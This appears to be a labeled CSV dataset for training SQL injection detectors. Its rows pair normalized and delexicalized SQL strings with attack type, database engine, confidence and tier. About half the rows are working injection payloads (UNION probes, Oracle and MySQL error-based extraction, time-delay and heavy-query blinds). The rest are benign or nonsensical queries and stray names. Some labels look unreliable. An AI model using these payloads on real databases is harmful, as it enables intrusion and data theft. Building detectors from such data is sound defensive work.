payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"select * from users WHERE username = ""-3859 ) or username = ""-5062 ) where 7457 = 7457 and username = ""-7874 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) where __INT__ = __INT__ and __IDENT__ = "" - __INT__ ) ) )",error_based,oracle,0.8,True,original,silver
"1',row ( 7937,5067 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 7937 = 7937,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 9974 union select 5497 union select 8209 union select 8147 ) a group by x )","__INT__ , __IDENT__ ( __INT__ , __INT__ ) > ( select count ( * ) , concat ( __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ , floor ( __IDENT__ ( __INT__ ) * __INT__ ) ) __IDENT__ from ( select __INT__ union select __INT__ union select __INT__ union select __INT__ ) __IDENT__ group by __IDENT__ )",error_based,generic,0.85,True,original,silver
"-8833' ) ) union all select 3227,3227,3227,3227,3227--","- __INT__ ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
SELECT * FROM wp_posts WHERE ID = 28731 LIMIT 1,select * from __IDENT__ where __IDENT__ = __INT__ limit __INT__,benign,mysql,0.9,False,original,silver
SELECT * FROM over 3 SELECT * FROM product,select * from __IDENT__ __INT__ select * from __IDENT__,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" and username = ""-6244\' ) as szpd where 8445 = 8445 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,mssql,0.8,True,original,silver
"-1197"" ) ) as dfsy where 8857 = 8857 or 3038 = 3038",- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
yu-chian,__IDENT__ - __IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1 and username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) ) ) and ( ( ( \ __STR__ = __IDENT__,auth_bypass,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - - """,error_based,oracle,0.9,True,original,silver
1' in boolean mode ) and 3787 = 7750--,__INT__ in __IDENT__ __IDENT__ ) and __INT__ = __INT__ - -,boolean_blind,generic,0.5,True,original,bronze
"1' union all select null,null,null,null,null,null--","__INT__ union all select null , null , null , null , null , null - -",union_based,generic,0.7,True,original,bronze
SELECT TOP 3 * FROM off SELECT * FROM dried 3SELECT * FROM bear,select top __INT__ * from __IDENT__ select * from __IDENT__ select * from __IDENT__,benign,generic,1.0,False,original,gold
"SELECT * FROM users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 AND username = ""1\'|| ( select \'jpso\' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||\'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,mysql,0.8,True,original,silver
"select * from users WHERE username = ""1"" or username = ""1%\' and \'%\' = \'"" or username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.8,True,original,silver
SELECT SUM ( Quantity ) FROM OrderDetails;,select sum ( __IDENT__ ) from __IDENT__ ;,benign,mysql,0.9,False,original,silver
solana de los barros,__IDENT__ __IDENT__ __IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" or username = ""-5313\' ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) )",error_based,oracle,0.9,True,original,silver
"select * from users WHERE username = ""-3733\' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1 ) ) as xoch where 8765 = 8765",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,oracle,0.8,True,original,silver
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki"" or username = ""1%\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ % \ __STR__ ) ) as __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.6,True,original,bronze
"select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%\' = \'"" and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-7874 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and ( ( ( \ __STR__ = __IDENT__ __STR__ - __INT__ ) ) ),error_based,oracle,0.85,True,original,silver
"1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","__INT__ __STR__ __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",time_blind,mysql,0.9,True,original,silver
"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ibdj' = 'ibdj",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True,original,silver
SELECT * FROM town WHERE industrial = 'under' AND City = 'mill',select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,benign,mysql,0.9,False,original,silver
"1"" ) as hsws where 6656 = 6656",__INT__ ) as __IDENT__ where __INT__ = __INT__,benign,generic,1.0,False,original,gold
"iif ( 1378 = 6569,1,1/0 )","__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",boolean_blind,mssql,0.7,True,original,bronze
1 ) where 1079 = 1079,__INT__ ) where __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""-3978 and username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""1\' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'hbwk\' like \'hbwk""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = __STR__,boolean_blind,oracle,0.8,True,original,silver
SELECT * FROM piano FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""-5585\' and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""-1254"" and username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) """,error_based,oracle,0.9,True,original,silver
"-1072%"" ) ) or 3090 = 3539","- __INT__ % "" ) ) or __INT__ = __INT__",boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""-8069\' ) ) or username = ""1\' ) ) ) and username = ""-2374 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'dyuo\' = \'dyuo""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( ( \ __STR__ = __IDENT__,error_based,oracle,0.95,True,original,gold
"INSERT INTO solar ( army, rise, youth, course, select, electricity ) VALUES ( 'exist', 'anywhere'. product', 'near', 'market', 'section', 'however' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , select , __IDENT__ ) values ( __STR__ , __STR__ . __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ )",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 1248 = 1248""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-7072\' ) and username = ""-2733\' ) ) ) or username = ""1\'|| ( select \'vasx\' where 4770 = 4770",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,postgresql,0.9,True,original,silver
gabriele,__IDENT__,benign,generic,0.9,False,original,silver
1%' ) ) and 9198 = 9198--,__INT__ % ' ) ) and __INT__ = __INT__ - -,boolean_blind,generic,0.8,True,original,silver
-2749' ) as fiho where 3531 = 3531 or 2777 = 1485#,- __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1\' and username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - - """,error_based,oracle,0.95,True,original,gold
"calle tampa 108, 7-g","__IDENT__ __IDENT__ __INT__ , __INT__ - __IDENT__",benign,generic,0.9,False,original,silver
"SELECT Orders.seldomrID, Employees.occur, Employees.income FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.weekID ORDER BY Orders.cowboyID","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,generic,1.0,False,original,gold
"1"" )",__INT__ ),boolean_blind,generic,0.8,True,original,silver
FROM ( SELECT DISTINCT family FROM journey ),from ( select distinct __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1"" or username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True,original,gold
"1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""gxqq"" = ""gxqq",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,mysql,0.85,True,original,silver
"SELECT * FROM baseball WHERE elephant BETWEEN ""suppose"" AND ""gas""",select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False,original,gold
SELECT * FROM develop,select * from __IDENT__,benign,generic,1.0,False,original,gold
"SELECT * FROM egg ORDER BY clothing, cheese","select * from __IDENT__ order by __IDENT__ , __IDENT__",benign,generic,1.0,False,original,gold
"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- kegk","__INT__ and __INT__ = like ( __STR__ , upper ( hex ( __IDENT__ ( __INT__ / __INT__ ) ) ) ) - - __IDENT__",time_blind,sqlite,0.7,True,original,bronze
"SELECT variety, mixture, fastened FROM day WHERE chief IS NULL","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ is null",benign,generic,1.0,False,original,gold
samanieg mitteenn,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""eslo"" like ""eslo",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,postgresql,0.7,True,original,bronze
1'|| ( select 'ywjy' where 7579 = 7579,__INT__ __STR__ __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"SELECT * FROM police ORDER BY forward ASC, than DESC","select * from __IDENT__ order by __IDENT__ asc , __IDENT__ desc",benign,generic,1.0,False,original,gold
cantbrico,__IDENT__,benign,generic,0.9,False,original,silver
SELECT dish ( s ) FROM jet,select __IDENT__ ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"SELECT * FROM hang WHERE fifteen NOT IN ( 'three', 'speech', 'furniture' )","select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False,original,gold
SELECT * FROM ( SELECT newspaper FROM dead ),select * from ( select __IDENT__ from __IDENT__ ),benign,mysql,0.9,False,original,silver
SELECT * FROM join WHERE bad = 'rain' OR silent = 'possible',select * from join where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
"1 ) where 5096 = 5096 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ ) where __INT__ = __INT__ and __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",heavy_query,postgresql,0.7,True,original,bronze
SELECT AVG ( Price ) FROM movie,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
calle pintor el greco 102 1-g,__IDENT__ __IDENT__ __IDENT__ __IDENT__ __INT__ __INT__ - __IDENT__,benign,generic,0.9,False,original,silver
"c/ alicante, 83,","__IDENT__ / __IDENT__ , __INT__ ,",benign,generic,0.9,False,original,silver
"SELECT thrownID AS ID, beyond AS surprise FROM ought","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#","- __INT__ % ' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True,original,bronze
"select * from users WHERE username = ""1\'+ ( select \'pvej\' where 4496 = 4496 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" or username = ""1 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) ),boolean_blind,oracle,0.8,True,original,silver
1%' ) union all select null--,__INT__ % ' ) union all select null - -,union_based,generic,0.7,True,original,bronze
SELECT AVG ( Price ) FROM exist,select avg ( __IDENT__ ) from __IDENT__,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-7874 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ),error_based,mssql,0.8,True,original,silver
"SELECT Orders.musicalrID, Employees.figure, Employees.between FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.forgetID ORDER BY Orders.circusID","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,generic,1.0,False,original,gold
"SELECT stairs AS cool, arrangement AS [truth] FROM forget","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
SELECT * FROM Suppliers;,select * from __IDENT__ ;,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'itxy\' like \'itxy""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,postgresql,0.9,True,original,silver
SELECT * FROM atmosphere,select * from __IDENT__,benign,generic,1.0,False,original,gold
hormilla,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM verb WHERE pay = 'thee' FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ where __IDENT__ = __STR__ fetch first __INT__ rows only,benign,generic,1.0,False,original,gold
po29ip1t0l6,__IDENT__,benign,generic,0.9,False,original,silver
SELECT AVG ( folks ) FROM able,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"1"" and elt ( 2373 = 5817,5817 ) and ""rsdt"" = ""rsdt",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mysql,0.7,True,original,bronze
n89m3nd2,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM bet WHERE NOT push = 'snow' AND NOT near = 'could',select * from __IDENT__ where not __IDENT__ = __STR__ and not __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
"1"" ) ) ) and make_set ( 7809 = 9564,9564 ) and ( ( ( ""jggk"" like ""jggk",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mysql,0.7,True,original,bronze
"1"" ) ) as upvg where 4826 = 4826",__INT__ ) ) as __IDENT__ where __INT__ = __INT__,union_based,generic,0.7,True,original,bronze
SELECT top ( s ) FROM movement UNION,select top ( __IDENT__ ) from __IDENT__ union,benign,mysql,0.9,False,original,silver
SELECT * FROM four WHERE sail = 'influence' AND ( later = 'movement' OR safety = 'sleep' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-1254"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-7430\' ) as xfah where 1596 = 1596","select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = __IDENT__ ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) or __IDENT__ = "" - __INT__ ) as __IDENT__ where __INT__ = __INT__",boolean_blind,oracle,0.8,True,original,silver
1 ) ) ) and 4595 = 4595#,__INT__ ) ) ) and __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
SELECT * FROM tin WHERE row NOT LIKE '[supper]%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,generic,1.0,False,original,gold
"-2979' ) ) as klou where 7092 = 7092 union all select 7092,7092--","- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
